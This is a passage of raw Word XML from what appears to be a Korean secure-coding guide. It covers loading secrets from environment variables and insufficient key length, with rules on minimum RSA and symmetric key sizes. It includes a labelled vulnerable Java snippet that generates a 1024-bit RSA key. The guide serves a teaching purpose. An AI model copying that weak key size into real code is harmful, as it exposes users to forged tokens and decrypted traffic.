              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로드</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// application.properties: db.password=ENC(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>암호화된값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">String password = System.getenv("DB_PASSWORD");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>환경변수에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로드</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> Spring: @Value("${db.password}") </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>주입</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>충분하지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않은</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>키</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>길이</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• RSA </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>알고리즘은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 2,048</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트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이상의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키를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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대칭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암호화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알고리즘은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 128</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>바이트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상의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키를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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] RSA 1024</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권장</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>미달</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>kpg.initialize(1024);  // 1024</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>현재</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>RSA 1024</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>현재</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라우드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>환경에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>~</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수주</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인수분해가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전자서명이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위조되거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>암호화된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복호화되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JWT </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, TLS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통신</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복호화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전자문서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위변조로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
